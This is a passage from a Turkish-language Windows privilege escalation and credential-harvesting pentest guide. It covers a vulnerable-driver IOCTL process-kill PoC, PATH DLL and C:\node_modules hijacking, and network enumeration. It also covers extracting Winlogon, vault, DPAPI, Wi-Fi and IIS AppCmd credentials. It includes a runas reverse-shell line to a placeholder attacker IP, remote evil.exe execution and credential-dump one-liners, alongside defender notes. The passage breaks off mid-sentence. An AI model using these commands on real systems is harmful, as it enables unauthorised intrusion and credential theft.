Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations for developers
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. Process termination veya handle döndürmeye izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri kısıtlayın (access mask'leri, METHOD_*, input validation) ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Detection ideas for defenders
- Şüpheli device name'lerine (ör. \\ .\\amsdk*) yönelik user-mode açma işlemlerini ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny list'lerinizi tutun.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir klasörde yazma izinleriniz** varsa, bir process tarafından yüklenen DLL'i hijack edip **privilege escalation** gerçekleştirebilirsiniz.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Daha fazla bilgi için bu denetimin nasıl kötüye kullanılabileceğine bakın:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme ele geçirmesi

Bu, `require("foo")` gibi çıplak bir import gerçekleştirdiklerinde ve beklenen modül **bulunamadığında** **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows denetimsiz arama yolu** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü kök dizinine kadar ulaşabilir; bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu konumları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalıştırılır; bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısı üzerinden veya otomatik başlatılan ayrıcalıklı bir masaüstü uygulaması olarak çalışıyorsa bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu senaryolarda yaygındır:

- bir bağımlılık `optionalDependencies` içinde tanımlanmışsa<sup>[[22]](#references)</sup>
- üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ediyorsa
- bir paket üretim derlemelerinden kaldırılmış, paketleme sırasında dahil edilmemiş veya yüklenememişse
- güvenlik açığına neden olan `require()` ana uygulama kodunda değil, bağımlılık ağacının derinliklerinde bulunuyorsa

### Güvenlik açığı olan hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef yürütülebilir dosya (`node.exe`, Electron uygulamasının EXE'si veya sarmalayıcı süreç) olacak şekilde filtreleyin
- `Path` alanında `node_modules` `contains` olacak şekilde filtreleyin
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Açılmış `.asar` dosyalarında veya uygulama kaynaklarında aranabilecek yararlı kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak incelemesi aracılığıyla **eksik paket adını** belirleyin.
2. Henüz mevcut değilse root lookup dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen adla birebir eşleşen bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül yoksa Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçekte karşılaşılan eksik isteğe bağlı modüller arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan **teknik** şudur: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleneceği herhangi bir **eksik çıplak import** bulun.

### Tespit ve güçlendirme fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlüklü süreçleri araştırın.
- Üretimde tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda `try { require("...") } catch {}` gibi sessiz kalıpları inceleyin.
- Kitaplık destekliyorsa isteğe bağlı denetimleri devre dışı bırakın (örneğin, bazı `ws` dağıtımlarında `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` denetimi önlenebilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasına sabit kodlanmış diğer bilinen bilgisayarları kontrol edin.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi süreç sahibi, executable path ve onu başlatan herhangi bir service veya scheduled task ile ilişkilendirin. Bir remote-control service, yalnızca authentication ve command kontrolleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklı bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve binary path pasif ipuçlarıdır; kimliği doğrulanmış bir memory-corruption yolu ise tam olarak bu binary'nin ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir portun bir system process'e ait olduğu görülüyorsa, backend service'i ilişkilendirmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) çıktısıyla karşılaştırın; tek başına bir forwarding rule, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik duvarıyla ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Ağ keşfi için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Linux için Windows Alt Sistemi (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

İkili `bash.exe`, `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root kullanıcısını elde ederseniz herhangi bir portu dinleyebilirsiniz (bir portu dinlemek için `nc.exe`'yi ilk kez kullandığınızda, GUI üzerinden `nc`'nin güvenlik duvarı tarafından engellenmesine izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Root olarak bash'i kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` yetkisi, tek başına Windows Administrator hakları sağlamaz. Geçerli Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını ( `/root/.bash_history` dahil) inceleyin; ancak yetki yükseltme için hâlâ daha yüksek ayrıcalıklara sahip geçerli bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2'de dağıtım genellikle bir [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) saklanır. Bu nedenle önce kullanılan dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş dosyalarının içeriğini ekrana yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgisi değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde düz metin olarak bulunan bir bulgudur. `AutoAdminLogon=1` olduğu hâlde okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak saklayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterini olağan şekilde okumak, bu secret'ın var olup olmadığını veya alınabilir olup olmadığını kanıtlamaz. Kimlik bilgisi ifşası bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Kimlik bilgileri yöneticisi / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault, **Windows**'un kullanıcıları **otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelere ait kimlik bilgilerini saklayıp tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına gelebilir; ancak sistem bu şekilde çalışmaz.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırmak için kullanabileceği kimlik bilgilerini saklar. Bu, bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının**, kullanıcıların sürekli kullanıcı adı ve parola girmesi yerine bu Credential Manager ve Windows Vault'u kullanıp sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanabileceklerini sanmıyorum. Dolayısıyla uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynağa ait kimlik bilgilerini istemek için bir şekilde **credential manager ile iletişim kurmalıdır**.

Makinede kayıtlı kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, SMB paylaşımı üzerinden uzak bir binary dosyayı çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla da kullanılabileceğini unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolaları Universal Windows Platform (UWP) `PasswordVault` içinde saklar (`vaultcmd` içinde `Web Credentials` olarak da sunulur). Bu depolama alanı oturumdan yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak şifresi çözülebilir.

Saklanan tüm kullanıcı adlarını ve düz metin parolalarını anında dump edip şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve Windows işletim sisteminde çoğunlukla asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcı oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi senaryolarında sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Kullanıcının özel anahtarlarını koruyan ana anahtarla aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell aracılığıyla listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**mimikatz module** `dpapi::masterkey` komutunu, uygun argümanlarla (`/pvk` veya `/rpc`) şifresini çözmek için kullanabilirsiniz.

**Ana parola tarafından korunan kimlik bilgisi dosyaları** genellikle şu konumlarda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Uygun `/masterkey` ile şifreyi çözmek için **mimikatz module** `dpapi::cred` kullanabilirsiniz.\
(root iseniz) `sekurlsa::dpapi` modülüyle **memory** içinden çok sayıda DPAPI **masterkeys** **extract** edebilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini kolayca saklamak için **scripting** ve otomasyon görevlerinde sıkça kullanılır. Kimlik bilgileri **DPAPI** ile korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılmış bir kimlik bilgisi rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir betik ya da dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` dizininde olduğunu varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedef hizmette geçerli haklara sahip olması ayrıca gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerleri yazdırmadan önce yolları ve ACL’leri inceleyin.

Bir dosyada bulunan PS kimlik bilgilerinin **şifresini çözmek** için şunları yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **herhangi bir .rdg dosyasının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **birçok DPAPI masterkey çıkarabilirsiniz**

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcı Documents klasöründeki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. XML dosyasını kimlik bilgisi adayı olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı taramalar sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir password öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, bir kimlik bilgisi adayı olarak değerlendirin: [vendor notları](https://www.donkz.nl/), profil korumasının oluşturan hesaba ve bilgisayara bağlanabileceğini veya daha az sıkı yapılandırılabileceğini belirtiyor. Bu bilgiye güvenmeden önce dosyanın kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

Kullanıcılar bazen Sticky Notes uygulamalarına parolalarını ve diğer bilgileri kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması notları genellikle `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar LevelDB dahil başka kullanıcı profili depoları kullanabilir. Notların olmadığını varsaymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa yalnızca `plum.sqlite` dosyasını kopyalamak, yakın zamanda commit edilmiş notları içermeyebilir. Veritabanının tutarlı bir kopyasıyla birlikte `plum.sqlite-wal` dosyasını da saklayın ve varsa `plum.sqlite-shm` dosyasını da ekleyin; shared-memory index yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. Bkz. [SQLite'ın WAL belgeleri](https://www.sqlite.org/wal.html). Hesap adı veya parola içeren bir not yalnızca bir kimlik bilgisi adayıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir password-manager kaydının daha yüksek ayrıcalıklı bir oturum açmayı kanıtlayabilmesi için ayrıca gerçek şifre çözme anahtarı ve uygulamaya özgü yorumlama gerekir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity level altında çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'tan alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Installer'lar **SYSTEM yetkileriyle çalıştırılır; birçoğu** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)** kaynağındaki bilgilere göre DLL Sideloading'e karşı savunmasızdır.**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Destek aracı kayıt defteri kimlik bilgisi kalıntıları

Bazı eski uzaktan destek kurulumları, sabit uygulama kayıt defteri anahtarlarında parola ile ilgili değer adlarını tutar. Örneğin, [satıcının kayıt defteri anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik bir oturum parolasını tanımlıyordu. Bir değer adı işareti yalnızca inceleme için bir ipucudur: bu kimlik bilgisini değerlendirirken kurulu sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Uzaktan destek parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanılıyor olması ve söz konusu hesap için yetkiniz bulunması gerekir. Şifreli verileri ve kurtarılan parolaları rutin envanter çıktısına dahil etmeyin.

### Korunan sayfalar içeren paylaşılan elektronik tablolar

Okunabilir bir paylaşılan çalışma kitabının hesap verileri içerdiğinden şüpheleniliyorsa, **dosya şifrelemesini** çalışma sayfası korumasından veya gizli sütunlardan ayırın. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) çalışma sayfası koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına çalışma kitabı içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz ve konuyla ilgili dosyaları inceleyin; kapsamlı envanter çıkarırken olası sırları ekrana yazdırmayın. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin bulunduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI sunucusunda tutulan değişiklik yamaları

Bir CI sunucusu, derleme bittikten sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity,](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` konumunu uzak çalıştırma değişikliklerinin depolandığı yer olarak belgeliyor; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama, kimlik bilgisi dosyasına, şifreleme anahtarına veya ikisini birden kullanan bir betiğe yapılan ekleme ya da kaldırma başvurularını koruyor olabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı, şifrelenmiş dizenin yanı sıra AES anahtarına da ihtiyaç duyar; [Microsoft,](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrıca sağlandığını belgeliyor. Önce yalnızca erişilebilir yama adlarını inceleyin; ardından yetkiniz dahilinde ilgili içeriği, sırları rutin envanter çıktısına yazdırmadan inceleyin. Bir yama yolu, şifrelenmiş bir değer veya anahtar başvurusu tek başına geçerli bir kimlik bilgisini ya da daha yüksek ayrıcalıklara erişimi kanıtlamaz. Veri dizininin ACL'lerini kısıtlayın ve sırlara derleme değişikliklerinde yer vermeyin.

### Özel yerel yönetici parolası döndürme

Özel olarak geliştirilmiş bir parola döndürücü, şifrelenmiş bir yerel yönetici parolasını yerel bir hizmette tutarken veri deposu kimlik bilgilerini okunabilir bir `.env` dosyasında veya güncelleyici ikilisinin yanında saklayabilir. Güncelleyicinin zamanlanmış görevini, hesabını, yapılandırma ACL'lerini, dinleyicisini ve veri deposu izinlerini birlikte inceleyin. Yalnızca loopback üzerinden erişilebilen bir veri deposuna, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulamasını geçmek, ilgili kayıtları okuma izni olduğunu kanıtlamaz. Şifreleme tohumu veya anahtar materyali şifreli verinin yanında erişilebiliyorsa, şifrelemeye güvenmeden önce anahtar türetme yöntemini dikkatlice inceleyin. Açığa çıkmış bir tohumdan Go'nun [`math/rand`](https://pkg.go.dev/math/rand) paketiyle deterministik olarak AES anahtarı türeten bir düzen, bu parolayı korumaya uygun değildir; Go, bu paketin güvenliğe duyarlı rastgelelik için uygun olmadığını belgeliyor. Kurtarılan herhangi bir parolanın güncel olduğunu ve bir yerel Administrators grubu hesabına ait olduğunu, bunu bir ayrıcalık yükseltme yolu olarak değerlendirmeden önce doğrulayın. Zamanlanmış bir görev, `.env` yolu veya şifrelenmiş veri bloğu bu koşullardan hiçbirini tek başına 